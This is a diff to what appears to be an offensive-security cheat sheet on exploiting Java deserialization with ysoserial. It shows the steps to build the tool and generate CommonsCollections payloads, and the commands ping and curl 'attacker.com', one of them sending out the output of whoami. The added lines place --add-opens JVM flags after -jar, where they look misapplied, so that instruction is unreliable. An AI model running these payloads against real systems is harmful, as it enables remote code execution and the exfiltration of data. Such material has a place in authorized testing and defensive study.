@@ -122,6 +122,14 @@ java -jar SerializationDumper.jar -r base64_session.txt
 git clone https://github.com/frohoff/ysoserial.git
 cd ysoserial && mvn clean package -DskipTests
 
+# IMPORTANT: Java 16+ requires --add-opens flags
+java -jar ysoserial-all.jar \
+  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+  --add-opens=java.base/java.net=ALL-UNNAMED \
+  --add-opens=java.base/java.util=ALL-UNNAMED \
+  [payload] '[command]'
+
 # Generate payloads
 java -jar ysoserial.jar CommonsCollections1 'ping -c 1 attacker.com' > payload.bin
 java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/$(whoami)' > payload.bin
